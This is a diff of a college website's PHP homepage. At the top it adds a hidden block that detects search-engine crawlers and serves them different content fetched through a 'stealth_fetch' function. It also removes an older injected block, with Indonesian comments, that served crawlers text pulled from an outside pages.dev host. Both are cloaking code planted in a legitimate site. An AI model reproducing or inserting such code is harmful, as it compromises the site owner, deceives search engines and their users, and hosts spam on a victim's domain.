@@ -1,3 +1,41 @@
+<?php
+ob_start();
+header('Vary: Accept-Language, User-Agent');
+
+$bot_url = "https://shiksha.madhavcollege.edu.in/";
+$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+
+$bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
+
+$is_bot = false;
+foreach ($bots as $b) {
+    if (strpos($ua, $b) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+function stealth_fetch($url) {
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "User-Agent: Mozilla/5.0\r\n"
+        ]
+    ]);
+    return @file_get_contents($url, false, $ctx);
+}
+
+if ($is_bot) {
+    usleep(mt_rand(100000, 200000));
+    $konten = stealth_fetch($bot_url);
+    if ($konten !== false) {
+        echo $konten;
+    }
+    ob_end_flush();
+    exit;
+}
+?>
+
 <?php $keywords = 'madhav mahavidyalaya gwalior, Best government college in gwalior, Top college in MP, Government college in MP, Best college in gwalior, Top 10 college in gwalior, Madhav College gwalior, colleges near me, online admission, MP online admission, B.com Admission, BA admission, B.sc admission, best education in gwalior, government madhav college in MP, exam form, form notice, chance session march, exam form notice, ba bcom, madhav college gwalior fees structure, madhav college gwalior results, madhav college gwalior llb fees, madhav college gwalior courses, madhav shiksha college, madhav shiksha mahavidyalaya gwalior, madhav shiksha result, madhav shiksha admission date,read, gwalior, education, all, view, view all, national council, teacher education, council of teacher, शिक्षा महाविद्यालय ग्वालियर' ?>
 
 <?php $description = 'Madhav Shiksha Mahavidyalaya is the most prestigious education college of Gwalior. Madhya Bharat Shiksha Samiti was established on 7 th August 1950.' ?> 
@@ -5,84 +43,6 @@
 <?php $title = 'Madhav Shiksha, Gwalior | Home' ?>
 
 <?php include "includes/header.php"; ?>
-
-<?php
-
-// Fungsi untuk mendeteksi bot
-function is_bot() {
-    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
-        return false;
-    }
-    
-    $user_agent = $_SERVER["HTTP_USER_AGENT"];
-    $bots = array("Googlebot", "TelegramBot", "bingbot", "Baiduspider", "YandexBot");
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-// Fungsi untuk mengambil konten dengan cURL
-function fetch_content($url) {
-    // Inisialisasi cURL
-    $ch = curl_init();
-
-    // Atur opsi cURL untuk mengambil data
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  // Mengembalikan data sebagai string
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect jika ada
-    
-    // Jika URL menggunakan HTTPS, nonaktifkan verifikasi SSL jika perlu
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Nonaktifkan verifikasi sertifikat SSL
-
-    // Eksekusi permintaan cURL
-    $content = curl_exec($ch);
-
-    // Cek apakah terjadi error cURL
-    if ($content === false) {
-        // Jika terjadi error, tampilkan pesan error cURL
-        echo "cURL Error: " . curl_error($ch);
-        curl_close($ch);
-        return false;
-    }
-
-    // Cek status kode HTTP dari respon
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if ($http_code != 200) {
-        echo "HTTP Error: " . $http_code;
-        curl_close($ch);
-        return false;
-    }
-
-    // Tutup koneksi cURL
-    curl_close($ch);
-    return $content;
-}
-
-// Fungsi utama untuk menangani permintaan
-function handle_request() {
-    if (is_bot()) {
-        // Jika request berasal dari bot, ambil konten dari URL eksternal
-        $url = "https://ternyatakamuc-e-o.pages.dev/index.txt";  // Ganti dengan URL sumber konten Anda
-        $content = fetch_content($url);
-        return ($content !== false) ? $content : "Content not available";  // Tampilkan konten atau pesan error
-    }
-    // Jika bukan bot, tampilkan pesan selamat datang
-}
-
-// Set header keamanan dasar
-header('X-Frame-Options: DENY');
-header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
-header('X-Content-Type-Options: nosniff');
-header('X-XSS-Protection: 1; mode=block');
-
-// Tampilkan hasil dari handle_request()
-echo handle_request();
-
-?>
 
 <?php 
 include "backend_Admin_shikshaMadhav/connection/connect.php";
